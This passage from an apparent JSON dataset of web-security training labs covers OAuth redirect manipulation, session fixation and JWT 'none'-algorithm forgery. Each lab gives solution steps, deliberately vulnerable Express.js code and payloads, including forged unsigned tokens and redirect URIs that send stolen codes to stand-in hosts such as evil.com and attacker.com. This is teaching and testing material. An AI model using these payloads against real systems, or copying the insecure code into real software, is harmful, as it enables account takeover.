    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const qs = require('qs'); const app = express(); const CLIENT_ID = 'abc123'; const CLIENT_SECRET = 'supersecret'; const REDIRECT_URI_WHITELIST = [/localhost/]; app.get('/auth/callback', async (req, res) => { const { code, redirect_uri } = req.query; if (!code || !redirect_uri) return res.status(400).send('Missing parameters');  const tokenRes = await axios.post('https://oauthprovider.com/token', qs.stringify({ code, client_id: CLIENT_ID, client_secret: CLIENT_SECRET, redirect_uri })); const { access_token } = tokenRes.data; const userRes = await axios.get('https://oauthprovider.com/userinfo', { headers: { Authorization: `Bearer ${access_token}` } }); const username = userRes.data.username; res.send(`Logged in as ${username}`); }); app.listen(3000);",
    "payloads": [
      "https://oauthprovider.com/auth?client_id=abc123&redirect_uri=http://evil.com/callback&response_type=code",
      "POST /oauth/token { code=<stolen_code>, redirect_uri=http://evil.com/callback, client_id=abc123, client_secret=supersecret }",
      "Authorization: Bearer <access_token>"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in URL",
    "Lab Description": "The application accepts session identifiers via URL query parameters and fails to regenerate them on successful login. An attacker can force a known session ID and trick a user into authenticating with it. To solve: fixate a known session ID and hijack the victim\u00e2\u20ac\u2122s session after login.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to spider the application and observe the ?sessionId= parameter in login URLs.",
      "Access the login page with a crafted URL like /login?sessionId=attacker12345 and note the session cookie is not set by the server.",
      "Send a phishing link with the sessionId=attacker12345 to the victim and wait for login.",
      "After the victim logs in, reuse the same sessionId in your browser to gain access.",
      "Access /my-account using the same sessionId value and confirm hijacked session access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = [{ username: 'carlos', password: 'secret123' }]; app.use((req, res, next) => { const sid = req.query.sessionId || req.headers['x-session-id']; if (sid && sessions[sid]) { req.user = sessions[sid]; } next(); }); app.get('/login', (req, res) => { const { username, password, sessionId } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user && sessionId) { sessions[sessionId] = user; res.send('Logged in with session ID'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { if (req.user) return res.send(`Welcome ${req.user.username}`); res.send('Not authenticated'); }); app.listen(3000);",
    "payloads": [
      "/login?sessionId=attacker12345",
      "Phishing link: https://victimsite.com/login?sessionId=attacker12345",
      "/my-account?sessionId=attacker12345"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in token validation",
    "Lab Description": "This lab's JWT-based authentication mechanism is vulnerable due to algorithm confusion. The server mistakenly trusts the algorithm value specified in the token header without verification. The application accepts tokens signed with 'none' and allows user impersonation. To solve: forge a JWT to impersonate the user 'admin' and access their profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to log in as a normal user and capture the issued JWT from the Authorization header.",
      "Analyze the decoded JWT at jwt.io and observe that it uses the 'HS256' algorithm.",
      "Replace the algorithm in the JWT header with 'none', set the payload's sub field to 'admin', and remove the signature portion.",
      "Send a GET request to /profile with the modified JWT in the Authorization: Bearer header.",
      "Verify successful exploitation by observing admin's profile data returned in the response."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'supersecret' }, { username: 'user1', password: 'userpass' }]; const SECRET = 'hardcodedsecret'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid login'); const token = jwt.sign({ sub: user.username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/profile', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); const verified = jwt.verify(token, SECRET, { algorithms: [decoded.header.alg] }); res.send(`Welcome ${verified.sub}, here is your profile.`); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(3000, () => console.log('JWT Lab running on port 3000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
      "{ \"alg\": \"none\" }, { \"sub\": \"admin\" }",
      "Authorization: Bearer <modified_token>"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID",
    "Lab Description": "This lab's session management system is vulnerable to session fixation due to predictable session IDs being accepted after login. The server issues session IDs before authentication and fails to rotate them upon login. To solve: set a session ID, trick a user into logging in, then reuse that session to access their account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a GET /login request before authentication and note the Set-Cookie: sessionId header.",
      "Modify your browser cookies to use a fixed sessionId (e.g., attacker1234) and send it with the login request.",
      "Share a phishing link with the victim containing this fixed sessionId via URL or cookie.",
      "Wait for the victim to log in, binding the fixed sessionId to their account.",
      "Revisit /account using the same fixed session cookie and observe access to the victim's dashboard."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 'secretpass' }; app.get('/login', (req, res) => { const sid = req.cookies.sessionId || Math.random().toString(36).substring(2); res.cookie('sessionId', sid); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username] === password) { sessions[req.cookies.sessionId] = username; res.redirect('/account'); } else { res.send('Login failed'); } }); app.get('/account', (req, res) => { const user = sessions[req.cookies.sessionId]; if (user) res.send(`Welcome back ${user}`); else res.status(403).send('Not authenticated'); }); app.listen(3000, () => console.log('Session Fixation Lab running on port 3000'));",
    "payloads": [
      "Set-Cookie: sessionId=attacker1234",
      "GET /login with fixed sessionId",
      "Victim logs in while sessionId=attacker1234",
      "GET /account using sessionId=attacker1234"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token theft via redirect URI manipulation",
    "Lab Description": "This lab uses OAuth's implicit grant type and suffers from a poorly validated redirect_uri parameter. The application incorrectly trusts any redirect_uri under the application's subdomain. To solve: inject a malicious redirect_uri that leaks the victim\u00e2\u20ac\u2122s access_token to your server.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to spider the OAuth login flow and identify the vulnerable redirect_uri parameter.",
      "Craft a malicious redirect_uri pointing to your controlled domain: https://attacker.example.com#access_token=<token>.",
      "Send a phishing link to the victim with the crafted redirect_uri parameter and prompt them to authorize access.",
      "Capture the token fragment via browser JS or server logs from attacker.example.com.",
      "Replay the token in Authorization: Bearer header to access victim's profile data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const users = { 'carlos': 'oauth-token-abc123' }; app.get('/auth', (req, res) => { const { response_type, client_id, redirect_uri } = req.query; if (!redirect_uri.startsWith('https://trusted.example.com')) return res.status(400).send('Invalid redirect'); const token = users['carlos']; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'oauth-token-abc123') res.send('Carlos profile data'); else res.status(403).send('Invalid token'); }); app.listen(3000, () => console.log('OAuth Redirect Lab running on port 3000'));",
    "payloads": [
      "https://trusted.example.com.evil.com#access_token=...",
      "https://attacker.example.com#access_token=<token>",
      "Authorization: Bearer oauth-token-abc123"
    ]
  },
  {
    "Lab scenario": "JWT signature spoofing via 'none' algorithm in API Gateway",
    "Lab Description": "This lab simulates a Node.js-based API protected by JWT tokens. However, the server fails to validate the signing algorithm and blindly trusts the 'alg' header. The application accepts tokens with the 'none' algorithm and treats them as valid. To solve the lab, craft a JWT with 'none' as the algorithm and access Carlos's protected resource endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to capture a valid JWT token issued after logging in with your own credentials.",
      "Inspect the token in jwt.io and identify its structure and header details.",
      "Replace the 'alg' value in the JWT header with 'none' and remove the signature.",
      "Change the 'sub' or 'username' claim in the JWT payload to 'carlos' to impersonate the victim.",
      "Use Burp Repeater or Postman to send an authenticated request to /api/user-info with the forged token in the Authorization header and verify Carlos's data is returned."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; const users = [{ username: 'carlos', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/api/user-info', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('No token provided'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const user = users.find(u => u.username === payload.payload.username); if (user) return res.json({ username: user.username, data: 'Sensitive user data' }); return res.status(404).send('User not found'); } try { const verified = jwt.verify(token, secret); return res.json({ username: verified.username, data: 'Sensitive user data' }); } catch (e) { return res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{ \"alg\": \"none\" }.{ \"username\": \"carlos\" }."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via referer header",
    "Lab Description": "The application implements OAuth 2.0 with an implicit grant flow. It redirects users with access tokens embedded in the URL fragment. However, the fragment is reflected into a third-party analytics script URL via a vulnerable referer header. To solve the lab, leak Carlos's token to your attacker server by triggering a login and capturing the referer.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to monitor all outbound requests while performing OAuth login as Carlos.",
      "Initiate login via /auth endpoint and observe the redirect URL containing an access_token in the URL fragment.",
      "Note the analytics.js third-party script embedded on the redirect landing page.",
      "Identify that the Referer header leaks the full URL, including the access_token fragment, when requesting the third-party script.",
      "Host a malicious third-party script that logs incoming referers, trick Carlos into logging in via your OAuth phishing link, and extract the leaked token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const users = [{ username: 'carlos', token: 'abc123xyz456' }]; app.get('/auth', (req, res) => { const token = 'abc123xyz456'; res.redirect(`/dashboard#access_token=${token}`); }); app.get('/dashboard', (req, res) => { res.send(`Welcome! <script src='https://third-party.com/analytics.js'></script>`); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://attacker.com/analytics.js?referer=https://victim.com/dashboard#access_token=abc123xyz456",
      "Social engineering phishing link using redirect_uri=https://victim.com/dashboard"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in login response",
    "Lab Description": "The application issues session IDs before user authentication and fails to regenerate them after login. This allows an attacker to fix a known session ID, get a victim to log in using it, and hijack the session. To solve the lab, log in as Carlos using a fixed session and retrieve his account data from the dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture the Set-Cookie header from the initial GET /login page and observe the predictable session ID format (e.g., sessid=xyz123).",
      "Manually modify your browser\u00e2\u20ac\u2122s cookie jar to use a crafted sessid value like sessid=fixme123.",
      "Send a phishing link to Carlos forcing him to use the crafted session ID (e.g., a hidden iframe or HTTP link using your pre-issued sessid).",
      "Wait for Carlos to authenticate using that fixed session ID.",
      "Revisit the /dashboard endpoint using the same sessid and confirm you\u00e2\u20ac\u2122re authenticated as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'hunter2' }]; app.get('/login', (req, res) => { const sid = 'sess-' + Math.random().toString(36).substring(2, 8); sessions[sid] = null; res.cookie('sessid', sid); res.send('Please log in'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sessid = req.cookies.sessid; const user = users.find(u => u.username === username && u.password === password); if (user && sessid) { sessions[sessid] = username; res.redirect('/dashboard'); } else { res.status(401).send('Login failed'); } }); app.get('/dashboard', (req, res) => { const sessid = req.cookies.sessid; const username = sessions[sessid]; if (username) { res.send(`Welcome back ${username}, here is your sensitive data.`); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Set-Cookie: sessid=sess-pwn123",
      "Phishing link: https://victim.com/login with embedded iframe forcing sessid=sess-pwn123",
      "Login as Carlos using same sessid to gain access to /dashboard"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Predictable Token in OAuth Flow",
    "Lab Description": "The OAuth login flow is improperly designed, allowing an attacker to fix the session identifier of a victim before authentication. The application accepts a static session ID from a GET parameter during the authorization phase, which persists after login. To solve: hijack Carlos's session by setting a fixed session ID before they authenticate and then reuse it to access their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth login flow during your own login attempt and observe the 'session_id' parameter passed via GET.",
      "Confirm that this session ID is reused post-authentication by inspecting the session cookie and comparing values.",
      "Craft a malicious OAuth login link with a fixed 'session_id' value and trick Carlos into authenticating through it (e.g., via social engineering or simulated webhook).",
      "Wait for Carlos to log in, then reuse the same session_id in your browser by setting the corresponding cookie manually via DevTools or Burp.",
      "Access /my-account with Carlos's hijacked session to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const url = require('url'); const app = express(); app.use(session({ secret: 'vulnerable_oauth', resave: false, saveUninitialized: true })); app.get('/auth/start', (req, res) => { const parsed = url.parse(req.url, true); const sessId = parsed.query.session_id; if (sessId) req.session.id = sessId; res.redirect('/oauth-provider'); }); app.get('/callback', (req, res) => { req.session.authenticated = true; req.session.user = 'carlos'; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.session.authenticated) res.send(`Welcome, ${req.session.user}`); else res.send('Please log in'); }); app.listen(3000, () => console.log('OAuth Session Fixation running'));",
    "payloads": [
      "GET /auth/start?session_id=attackerSession123",
      "Set-Cookie: connect.sid=attackerSession123; path=/; HttpOnly",
      "Reuse fixed session after victim login"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Exploitation in Token Verification",
    "Lab Description": "This lab's JWT-based authentication system incorrectly allows tokens signed with the 'none' algorithm to bypass signature verification. The application fails to enforce algorithm restrictions during verification. To solve: forge a JWT token impersonating Carlos by crafting a token with 'alg: none'.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Log in to your own account and intercept the JWT token received using Postman or Burp Suite.",
      "Use jwt.io to decode the token and examine the header and payload structure.",
      "Modify the JWT header to set 'alg' to 'none' and set the payload to { \"username\": \"carlos\" }.",
      "Remove the signature entirely and send the forged token in an Authorization: Bearer header.",
      "Send a GET request to /my-account using the modified token to verify access and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'secretkey', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.username === 'carlos') res.send('Account details for carlos'); else res.send('Access denied'); }); app.listen(3000, () => console.log('JWT None Algorithm Lab running'));",
    "payloads": [
      "{ \"alg\": \"none\", \"typ\": \"JWT\" }",
      "{ \"username\": \"carlos\" }",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Broken Redirect in OAuth Callback Enables Token Theft",
    "Lab Description": "The OAuth flow includes an open redirect vulnerability at the callback endpoint, allowing an attacker to steal the authorization code. The application uses an insecure redirect URI provided in the query string without validating its domain. To solve: hijack Carlos\u00e2\u20ac\u2122s login OAuth flow, extract the code, and use it to gain access to his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to spider the OAuth login process and identify the callback endpoint accepting a 'redirect_uri' parameter.",
      "Confirm via manual testing that the application blindly redirects to untrusted domains without verification.",
      "Host a malicious redirector that logs incoming GET parameters (e.g., webhook.site or requestbin).",
      "Send Carlos a phishing OAuth login link with your malicious redirect_uri and wait for the authorization code to be captured.",
      "Use the stolen code to manually complete the OAuth exchange and gain access to Carlos\u00e2\u20ac\u2122s session token.",
      "Use the token in the Authorization header and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/auth/callback', (req, res) => { const redirectUrl = req.query.redirect_uri; const code = 'code123-carlos'; res.redirect(`${redirectUrl}?code=${code}`); }); app.get('/exchange', (req, res) => { const { code } = req.query; if (code === 'code123-carlos') res.json({ access_token: 'carlos-token' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-token') res.send('Account details for carlos'); else res.send('Unauthorized'); }); app.listen(4000, () => console.log('Broken OAuth Redirect Lab running'));",
    "payloads": [
      "GET /auth/callback?redirect_uri=https://attacker.com/stealer",
      "https://attacker.com/stealer?code=code123-carlos",
      "GET /exchange?code=code123-carlos",
      "Authorization: Bearer carlos-token"
    ]
  },
  {
    "Lab scenario": "JWT signature spoofing via 'none' algorithm in login API",
    "Lab Description": "This lab implements stateless session management using JSON Web Tokens (JWT). The login endpoint generates a signed token that is used to authenticate subsequent requests. However, the application improperly allows the use of the 'none' algorithm. To solve: Forge a JWT token with 'alg':'none' and access Carlos's account without knowing his password.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the POST /login request using Burp Suite to analyze the JWT returned upon successful login.",
      "Copy the JWT and decode it using jwt.io or Burp Decoder. Note the header contains 'alg':'HS256'.",
      "Replace 'alg':'HS256' with 'alg':'none' in the header and change the payload to {\"username\":\"carlos\"}.",
      "Remove the signature part of the JWT entirely, and reassemble the header and payload parts using base64url encoding.",
      "Use Postman to send a GET request to /my-account with the forged token in the Authorization: Bearer header and verify access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'supersecure' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username }, 'secretkey', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Unauthorized'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.username === 'carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Forbidden'); } }); app.listen(3000, () => console.log('JWT Lab running on port 3000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{ \"alg\": \"none\" } + { \"username\": \"carlos\" } => base64url(header).base64url(payload)."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in login flow",
    "Lab Description": "This lab's login system is vulnerable to session fixation because it fails to generate a new session identifier upon successful authentication. Attackers can set their own session ID and trick the victim into using it. To solve: Fix a session ID for Carlos before login, then access his account after he logs in using that ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp to intercept the GET /login request and insert a custom session cookie: sessionid=attacker123.",
      "Send the link with this fixed session ID to the victim (simulated by a provided action) and let them log in.",
      "After the victim logs in, the session remains fixed as attacker123.",
      "Send a GET request to /my-account using the sessionid=attacker123 cookie.",
      "Observe that you are now logged in as Carlos and can access his account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'strongpass' }]; app.get('/login', (req, res) => { const sid = req.cookies.sessionid || 'sess' + Math.random().toString(36).substr(2); res.cookie('sessionid', sid); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Login failed'); sessions[req.cookies.sessionid] = username; res.send('Logged in'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user === 'carlos') res.send('Account details for carlos'); else res.status(401).send('Unauthorized'); }); app.listen(3000, () => console.log('Session Fixation Lab running on port 3000'));",
    "payloads": [
      "Cookie: sessionid=attacker123",
      "http://victim-app.com/login?sessionid=attacker123",
      "GET /my-account with Cookie: sessionid=attacker123"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect and trust leak",
    "Lab Description": "This OAuth login flow is misconfigured and trusts any redirect_uri parameter, allowing an attacker to steal authorization codes. The application blindly trusts the redirect_uri without validation. To solve: Steal Carlos's OAuth authorization code by crafting a malicious redirect_uri.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to trace the OAuth login flow and observe the authorization URL with parameters: client_id, redirect_uri, response_type.",
      "Modify the redirect_uri to point to your exploit server: http://attacker.com/capture.",
      "Send the crafted OAuth URL to Carlos (simulated trigger).",
      "Start a listener on http://attacker.com/capture to log incoming requests.",
      "When Carlos clicks the link and authorizes access, his code is sent to your redirect_uri.",
      "Use the stolen code in a POST /token request to obtain Carlos's access token and retrieve his account info."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const validCodes = {}; app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; const code = 'authcode-carlos'; validCodes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}`); }); app.post('/token', (req, res) => { const { code } = req.body; const user = validCodes[code]; if (!user) return res.status(403).send('Invalid code'); res.json({ access_token: 'token-carlos' }); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer token-carlos') res.send('Account details for carlos'); else res.status(401).send('Unauthorized'); }); app.listen(3000, () => console.log('OAuth Lab running on port 3000'));",
    "payloads": [
      "https://victim-app.com/auth?client_id=xyz&redirect_uri=http://attacker.com/capture&response_type=code",
      "POST /token with body: code=authcode-carlos",
      "Authorization: Bearer token-carlos"
    ]
  },
  {
    "Lab scenario": "JWT signature bypass via 'none' algorithm in API token validation",
    "Lab Description": "The application's authentication is handled via a JWT token passed in the Authorization header. The server accepts unsigned JWT tokens when the `alg` is set to 'none'. The application trusts the token's payload without signature verification. To solve: craft a forged JWT for user 'admin' and access the protected /admin endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a legitimate login request and capture the JWT from the Authorization header.",
      "Decode the JWT using jwt.io or a local script to inspect the header and payload.",
      "Modify the header to set \"alg\":\"none\" and change the payload to {\"username\":\"admin\"}.",
      "Remove the signature portion entirely to finalize the forged token.",
      "Use Postman to send a new GET request to /admin with the forged token in the Authorization header.",
      "Confirm access to the admin panel to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecret'; app.get('/admin', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (!token) return res.status(401).send('Token required'); try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.username !== 'admin') return res.status(403).send('Admins only'); res.send('Welcome, admin!'); } catch (e) { res.status(400).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT None Bypass Lab on http://localhost:4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration via open redirect in redirect_uri parameter",
    "Lab Description": "The application uses OAuth 2.0 for user authentication. It trusts the 'redirect_uri' parameter without validating it against a whitelist. This allows an attacker to redirect the authorization code to their own domain and complete the OAuth flow. To solve: hijack an OAuth session and access the victim\u00e2\u20ac\u2122s account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate a login flow and observe the redirect to the OAuth provider (Google OAuth endpoint).",
      "Copy the authorization URL with a legitimate redirect_uri.",
      "Replace the redirect_uri with your attacker-controlled endpoint (e.g., http://evil.com/callback).",
      "Serve a local server to catch the redirect containing the authorization code.",
      "Exchange the intercepted code for an access_token using Postman against the token endpoint.",
      "Use the access_token to call the application\u00e2\u20ac\u2122s /profile API as the victim and retrieve private data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const url = `https://accounts.google.com/o/oauth2/auth?client_id=xyz&redirect_uri=${redirectUri}&response_type=code`; res.redirect(url); }); app.get('/callback', (req, res) => { const code = req.query.code; request.post({ url: 'https://oauth2.googleapis.com/token', form: { code, client_id: 'xyz', client_secret: 'abc', redirect_uri: 'http://localhost:4000/callback', grant_type: 'authorization_code' } }, (err, _, body) => { res.send('OAuth token: ' + body); }); }); app.listen(4000, () => console.log('OAuth Redirect Lab running on http://localhost:4000'));",
    "payloads": [
      "https://accounts.google.com/o/oauth2/auth?client_id=xyz&redirect_uri=http://evil.com/callback&response_type=code",
      "https://example.com/auth?redirect_uri=http://evil.com/callback"
    ]
  },
  {
    "Lab scenario": "Session fixation via static session ID assignment in login handler",
    "Lab Description": "The application assigns a static session ID based on the username during login. An attacker can preset this ID for a victim before login. To solve: set a valid session ID for 'carlos' before he logs in, then hijack the session and access /my-account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp to send a GET /set-session?user=carlos before he logs in to establish the session ID manually.",
      "Observe that the session ID is set as a predictable cookie, e.g., carlos_session123.",
      "Wait until the victim logs in or simulate login from another tab using the same session.",
      "Reuse the session cookie in a new GET request to /my-account using Postman.",
      "If session is active and hijacked successfully, the account page of 'carlos' will load and the lab is solved."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'qwerty' }]; app.get('/set-session', (req, res) => { const user = req.query.user; res.cookie('session', `${user}_session123`); res.send('Session preset'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); res.send('Login successful'); }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session === 'carlos_session123') res.send('Welcome to Carlos's account'); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "GET /set-session?user=carlos \u00e2\u2020\u2019 Cookie: session=carlos_session123",
      "Cookie: session=carlos_session123"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID reuse",
    "Lab Description": "The application reuses the same session ID across unauthenticated and authenticated states. When a user logs in, the existing session is not invalidated. This behavior allows session fixation. To solve: Fixate the session of the victim user Carlos and access his account after forcing a login.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the GET /login page request and note the Set-Cookie header with the session ID.",
      "Send this session to Burp Repeater and confirm that it works anonymously.",
      "Craft a phishing link using this fixed session ID and trick Carlos into clicking it (simulate with browser + intercepted request).",
      "Wait until Carlos logs in and refresh the original session (with same ID) in your browser.",
      "Verify session is now authenticated as Carlos by visiting /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'weaksecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/login', (req, res) => { res.sendFile(__dirname + '/login.html'); }); app.post('/login', express.urlencoded({ extended: true }), (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/my-account'); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { if (req.session.user) { res.send(`Welcome ${req.session.user}`); } else { res.send('Not authenticated'); } }); app.listen(3000);",
    "payloads": [
      "Set-Cookie: session=abc123; Path=/",
      "GET /my-account with session cookie after victim login",
      "Phishing link with session fixation"
    ]
  },
  {
    "Lab scenario": "JWT tampering via 'none' algorithm attack",
    "Lab Description": "The application uses JSON Web Tokens (JWT) for authentication, but fails to validate the algorithm in the JWT header. The application accepts tokens signed with 'none' algorithm, allowing attackers to forge arbitrary tokens. To solve: Forge a valid JWT token as admin using 'none' algorithm and access the /admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite or Postman to intercept a JWT after logging in with any user.",
      "Decode the JWT using jwt.io and inspect the header. Note the 'alg' field.",
      "Craft a new JWT manually with header: {\"alg\":\"none\",\"typ\":\"JWT\"} and payload: {\"username\":\"admin\"}. Leave signature blank.",
      "Replace the JWT in the Authorization: Bearer header with the forged token.",
      "Send request to GET /admin and verify access is granted."
    ],
    "Vulnerability name": "Authentication",
